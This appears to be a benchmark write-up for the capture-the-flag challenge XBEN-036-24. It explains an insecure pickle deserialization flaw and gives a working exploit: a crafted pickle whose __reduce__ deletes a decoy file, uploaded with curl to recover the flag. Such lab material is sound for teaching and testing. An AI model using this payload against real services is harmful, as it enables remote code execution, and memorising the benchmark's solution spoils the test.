# XBEN-036-24 — Green pickle

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Insecure deserialization (Python `pickle.loads()` on untrusted upload) → Remote Code Execution.

## Summary

`app/main.py`'s `POST /` handler calls `pickle.loads(await pickle_file.read())` directly on the uploaded file's bytes, with no restriction on class/module, no signing, no sandboxing. Python's `pickle` protocol invokes an object's `__reduce__` method during unpickling to reconstruct it, and `__reduce__` can return an arbitrary callable plus arguments to invoke — giving trivial RCE on unpickle. Separately, the index page prefers `decoy.txt` over `flag.txt` if `decoy.txt` exists:

```python
if os.path.exists('decoy.txt'):
    flag = open('decoy.txt').read()
else:
    flag = open('flag.txt').read()
```

So the exploit is simply: craft a pickle whose `__reduce__` calls `os.remove('decoy.txt')`, upload it, and the very same response (which re-renders the index page after unpickling) now falls through to read the real `flag.txt`.

## Exploit

```bash
python3 -c "
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.remove, ('decoy.txt',))

with open('evil.pickle', 'wb') as f:
    pickle.dump(Exploit(), f)
"

curl -s -F "pickle_file=@evil.pickle" http://localhost:65211/
```
